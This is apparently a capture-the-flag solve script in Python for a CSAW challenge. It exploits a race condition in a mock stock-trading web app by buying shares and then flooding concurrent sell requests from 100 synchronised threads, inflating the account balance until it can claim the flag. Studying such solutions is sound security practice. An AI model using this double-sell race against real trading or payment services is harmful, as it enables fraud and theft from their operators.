import threading
import requests
import time

STOCKS = [
    "AAPLISH", "AMAZING", "FACEFLOP", "GOOBER", "SPOTLITE", "ELONX", 
    "CRUISEBOOK", "SNAPSTAR", "TWEETIFY", "ZUCKTECH", "BURPSHARKHAT", "BROOKING"
]

URL = "http://android-dropper.csaw.io:4657"
SESSION = requests.Session()
TIMEOUT = 1.5
NUM_THREADS = 100
TARGET_BALANCE = 9001


def get_status():
    r = SESSION.get(f"{URL}/status")
    if r.ok:
        return r.json()
    return None


def buy_all_stocks():
    status = get_status()
    if not status:
        return
    balance = status.get("balance", 0)
    for stock in STOCKS:
        # calculate max shares for each stock
        price = status.get(stock, 0)
        stock_price = price if price else 100  # fallback
        to_buy = int(balance // stock_price)
        if to_buy == 0:
            continue
        data = {"symbol": stock, "amount": to_buy}
        SESSION.post(f"{URL}/buy", data=data)
        time.sleep(0.05)


def sell_race():
    barrier = threading.Barrier(NUM_THREADS)
    threads = []
    for stock in STOCKS:
        def sell_task(symbol=stock):
            try:
                barrier.wait()
            except threading.BrokenBarrierError:
                pass
            data = {"symbol": symbol, "amount": 1}  # race with 1 stock at a time
            for _ in range(5):
                try:
                    SESSION.post(f"{URL}/sell", data=data, timeout=TIMEOUT)
                except Exception:
                    continue
        for _ in range(NUM_THREADS):
            t = threading.Thread(target=sell_task)
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        threads = []  # Reset for next symbol
        time.sleep(0.15)


def try_flag():
    r = SESSION.post(f"{URL}/flag")
    if r.ok and 'csawctf{' in r.text:
        print('FLAG:', r.text.strip())
        return r.text.strip()
    return None


def main():
    tries = 0
    while tries < 30:
        print(f"[Try {tries+1}] Buying all stocks...")
        buy_all_stocks()
        print("Spamming SELL requests for all stocks...")
        sell_race()
        status = get_status()
        if status:
            bal = status.get("balance", 0)
            print(f"[Try {tries+1}] Balance: ${bal:.2f}")
            if bal >= TARGET_BALANCE:
                flag = try_flag()
                if flag:
                    break
        tries += 1
        time.sleep(0.8)  # Give time for backend to settle

if __name__ == '__main__':
    main()

